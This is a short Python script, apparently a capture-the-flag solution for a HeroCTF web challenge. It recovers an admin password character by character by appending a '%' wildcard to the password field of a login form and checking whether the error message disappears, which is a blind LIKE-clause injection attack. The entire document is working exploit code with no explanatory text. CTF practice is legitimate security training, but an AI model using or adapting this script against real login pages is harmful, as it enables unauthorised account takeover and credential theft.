#!/usr/bin/env python3
import requests
import string
import time

# exclude '%'
candidates = string.printable[:66] + string.printable[67:]

def guess():
    user = "admin"
    pw = []
    url = "http://chall1.heroctf.fr:8080/index.php"
    for i in range(10):
        for a in candidates:
            pw.append(a)
            rsp = requests.post(url, data={
                "username": user,
                "password": ''.join(pw) + '%',},
                headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                },)

            if not "Wrong username or password" in rsp.text:
                print(pw)
                break
            pw = pw[:len(pw)-1]
            time.sleep(1)

    print('password:', ''.join(pw))

guess()
